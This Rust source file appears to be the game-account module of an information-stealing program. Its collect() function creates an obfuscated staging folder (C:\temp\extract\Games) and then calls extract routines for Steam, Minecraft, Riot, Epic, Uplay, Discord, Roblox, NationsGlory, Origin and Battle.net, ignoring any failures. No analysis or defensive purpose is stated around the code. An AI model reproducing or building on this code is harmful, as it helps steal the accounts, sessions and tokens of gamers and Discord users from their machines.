use crate::sprotect;

#[macro_export]
macro_rules! safe_file_name {
    ($path:expr) => {
        $path.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
    };
}

pub mod gsteam;
pub mod gminecraft;
pub mod griot;
pub mod gepic;
pub mod guplay;
pub mod gdiscord;
pub mod groblox;
pub mod gnationsglory;
pub mod goriginea;
pub mod gbattlenet;

pub async fn collect() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games");
    std::fs::create_dir_all(&output_dir)?;
    
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
    }

    gsteam::extract().await.ok();
    gminecraft::extract().await.ok();
    griot::extract().await.ok();
    gepic::extract().await.ok();
    guplay::extract().await.ok();
    gdiscord::extract().await.ok();
    groblox::extract().await.ok();
    gnationsglory::extract().await.ok();
    goriginea::extract().await.ok();
    gbattlenet::extract().await.ok();

    Ok(())
}